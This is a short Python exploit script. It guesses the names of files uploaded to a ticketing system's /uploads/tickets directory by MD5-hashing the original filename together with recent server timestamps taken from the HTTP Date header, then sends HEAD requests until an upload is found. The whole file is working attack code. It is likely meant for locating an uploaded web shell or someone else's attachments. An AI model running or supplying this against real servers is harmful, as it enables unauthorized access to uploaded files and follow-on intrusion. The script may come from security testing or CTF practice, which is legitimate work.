#!/usr/bin/env python3
import requests as r
from sys import argv, exit
from datetime import datetime as dt, timezone as tz
from hashlib import md5

# Runtime settings
interval = 120
server_tz = tz.utc
upload_dir = '/uploads/tickets'

# Colorful output
class color:
    green = '\033[92m'
    yellow = '\033[93m'
    red = '\033[91m'
    end = '\033[0m'

# Get current time on server in epoch format
def get_server_time() -> int:
    try: res = r.get(base_url)
    except: handle_conn_err()
    return int(dt.strptime(res.headers['date'], '%a, %d %b %Y %H:%M:%S %Z').replace(tzinfo=server_tz).timestamp())

# Create an MD5 hash of a string
def hash(data: str) -> str:
    return md5(data.encode()).hexdigest()

# Handle connection error
def handle_conn_err() -> None:
    print('Could not establish connection with the server.')
    exit(1)

# Parse arguments
if len(argv) == 3:
    base_url = argv[1]
    file = argv[2]
else:
    print('Usage: ./exploit.py <url> <file>')
    exit(1)

# Extract extension from filename
ext = file.rsplit('.',1)[1]

# Get current timestamp from the server
server_time = get_server_time()

# Iterate
for i in range(interval):
    # Create filename
    data = f'{file}{server_time - i}'
    filename = f'{hash(data)}.{ext}'

    # Check if file exists
    print(f'\r{base_url}{upload_dir}/{color.yellow}{filename}{color.end} [{data}] ({dt.fromtimestamp(server_time - i)})', end='')
    try: res = r.head(f'{base_url}{upload_dir}/{filename}')
    except: handle_conn_err()
    if res.status_code == 200:
        print(f'\nFound: {color.green}{filename}{color.end}')
        exit()

print(f'\n{color.red}No file found.{color.end}')